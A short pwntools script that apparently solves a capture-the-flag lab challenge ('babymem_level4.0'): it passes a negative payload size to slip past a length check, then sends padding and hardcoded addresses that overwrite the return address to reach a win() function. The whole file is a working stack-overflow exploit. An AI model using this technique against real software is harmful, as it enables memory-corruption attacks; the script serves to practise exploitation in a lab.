from pwn import * 

context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64 
context.terminal = ['tmux', 'splitw', '-v']

proc = process(["/challenge/babymem_level4.0"])
proc.recvuntil(b'Payload size: ')

proc.sendline(b'-1')
proc.recv()

payload = b'A' * 56 + p64(0x00007ffef6319890) + p64(0x00000000004011d0) + p64(0x00007ffef6318810) + p64(0x00007ffef6319890) + p64(0x0000000000401639)
proc.sendline(payload)

proc.interactive()

# return address of the win() function => 0000000000401639
